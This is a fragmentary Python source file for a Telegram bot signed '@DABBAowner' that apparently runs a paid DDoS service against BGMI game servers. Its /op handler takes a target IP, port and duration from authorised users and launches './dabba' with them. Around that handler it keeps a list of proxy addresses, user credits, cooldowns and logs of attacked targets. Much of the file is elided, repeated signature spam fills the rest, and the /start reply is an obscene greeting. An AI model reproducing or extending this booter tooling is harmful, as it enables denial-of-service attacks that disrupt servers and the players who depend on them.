...
# @DABBAowner GRPTg #from keep_alive import keep_alive
# @DABBAowner GRP #keep_alive()
...
# @DABBAowner GRP # File to store command logs
LOG_FILE = "log.txt"


# @DABBAowner GRP # List of proxy addresses
PROXIES = [
...
"https://162.223.94.164:80",#script by @DABBAowner 🚩
...
"https://50.168.163.182:80",#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
...
"https://3.12.144.146:3128",#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
...
"https://50.174.7.157:80",#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
...
"https://12.186.205.122:80",#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
...
"https://50.239.72.18:80",#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
...
"https://134.73.65.97:6649"
    # @DABBAowner GRP # Add more proxy addresses as needed
]
...
# @DABBAowner GRP# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # @DABBAowner GRP # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
...
# @DABBAowner GRP # Function to log command to the file
def log_command(user_id, target, port, time):
    ...
    with open(LOG_FILE, "a") as file:  # @DABBAowner GRP # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# @DABBAowner GRP # Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = ". No data found ."#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
...
# @DABBAowner GRP # Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
...
def add_user(message):
    ...
    if user_id in admin_id:
        command = message.text.split()#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
#script by @DABBAowner 🚩
...
# @DABBAowner GRP # Function to handle the reply when free users run the /bgmi command
...
# @DABBAowner GRP # Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}
...
# @DABBAowner GRP # Handler for /bgmi command
@bot.message_handler(commands=['op'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # @DABBAowner GRP # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # @DABBAowner GRP # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
                response = "🦋⁂༄𝙲𝙤𝙤𝕝𝒅𝒐ฬ𝒏༄⁂🦋"
                bot.reply_to(message, response)
                return
            # @DABBAowner GRP # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # @DABBAowner GRP # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # @DABBAowner GRP # Convert time to integer
            time = int(command[3])  # @DABBAowner GRP # Convert port to integer
            if time > 180:
                ...
                full_command = f"./dabba {target} {port} {time} 900"
...
# @DABBAowner GRP # Add /mylogs command to display logs recorded for bgmi and website commands

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''BHEN CHOD DO BGMI KI 💦💦🍑'''
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['owner'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''@DABBAowner'''
    bot.reply_to(message, response)
